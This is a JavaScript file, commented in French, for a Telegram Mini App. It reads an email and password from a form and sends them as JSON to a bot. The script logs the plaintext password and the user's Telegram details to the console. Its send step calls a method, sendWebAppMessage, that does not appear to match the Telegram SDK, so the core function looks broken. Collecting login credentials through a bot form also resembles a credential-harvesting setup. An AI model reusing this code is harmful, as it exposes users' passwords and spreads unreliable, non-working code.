document.addEventListener('DOMContentLoaded', () => {
    console.log('DOM Content Loaded - script.js started'); // Message au démarrage du script

    // Vérifie si l'SDK Telegram Web App est disponible
    if (window.Telegram && window.Telegram.WebApp) {
        const WebApp = window.Telegram.WebApp;
        console.log('Telegram Web App SDK detected.'); // Confirmation du SDK
        WebApp.ready(); // Indique que l'appli est prête, c'est une bonne pratique

        // Gérer le clic sur le bouton "Fermer l'application"
        const closeButton = document.getElementById('closeButton');
        if (closeButton) {
            console.log('Close button found.');
            closeButton.addEventListener('click', () => {
                console.log('Close button clicked. Closing WebApp...');
                WebApp.close(); // Ferme la Mini App
            });
        } else {
            console.warn('Close button not found with ID "closeButton"!');
        }

        // ---------- Logique principale pour le formulaire ----------
        const myForm = document.getElementById('myForm');
        if (myForm) {
            console.log('Form found with ID "myForm".');
            myForm.addEventListener('submit', (event) => {
                event.preventDefault(); // Empêche le rechargement de la page par défaut
                console.log('Form submission event triggered.'); // Message à la soumission

                const emailInput = document.getElementById('email');
                const passwordInput = document.getElementById('password');

                // Vérification si les éléments input ont bien été trouvés
                if (!emailInput || !passwordInput) {
                    console.error('Email or password input elements not found in the DOM!');
                    WebApp.showAlert('Erreur: Champs du formulaire introuvables.');
                    return; // Arrête l'exécution
                }

                const email = emailInput.value;
                const password = passwordInput.value;

                // --- Validation basique côté client (recommandé) ---
                if (!email || !password) {
                    WebApp.showAlert('Veuillez remplir tous les champs.');
                    console.warn('Form submission prevented: fields are empty.');
                    return;
                }
                if (!email.includes('@') || !email.includes('.')) {
                    WebApp.showAlert('Veuillez entrer une adresse email valide.');
                    console.warn('Form submission prevented: invalid email format.');
                    return;
                }
                // Vous pouvez ajouter d'autres validations ici (longueur mot de passe, etc.)
                // --- Fin Validation ---

                // Prépare les données à envoyer
                const formData = {
                    email: email,
                    password: password
                };
                const dataToSend = JSON.stringify(formData);

                console.log('Form data prepared:', formData);
                console.log('Sending data to bot via WebApp.sendWebAppMessage()...');

                // Affiche un message de confirmation à l'utilisateur via une alerte Telegram
                WebApp.showAlert(`Formulaire soumis !\nEmail: ${email}\nMot de passe: ${password.replace(/./g, '*')}`);

                // Envoie les données au bot Telegram
                WebApp.sendWebAppMessage(dataToSend);

                // Réinitialise le formulaire après l'envoi
                myForm.reset(); 
                console.log('Form reset.');
                
                // Optionnel : Vous pouvez aussi fermer l'application après un envoi réussi
                // WebApp.close(); 
                // console.log('Web App closed after form submission.');
            });
        } else {
            console.error('Form not found with ID "myForm"!'); // Message d'erreur si le formulaire n'est pas trouvé
        }
        // ---------- Fin de la logique pour le formulaire ----------

        // Optionnel : Afficher des informations de débogage générales
        console.log('Telegram Web App SDK est prêt. Informations supplémentaires :');
        console.log('Thème:', WebApp.themeParams);
        console.log('User:', WebApp.initDataUnsafe.user);

    } else {
        // Logique si l'application n'est pas exécutée dans Telegram
        console.warn('Telegram Web App SDK non disponible. L\'application ne s\'exécute pas dans Telegram.');
        document.querySelector('.container').innerHTML = '<h1>Bonjour en dehors de Telegram!</h1><p>Cette application est conçue pour être exécutée dans Telegram.</p>';
    }
});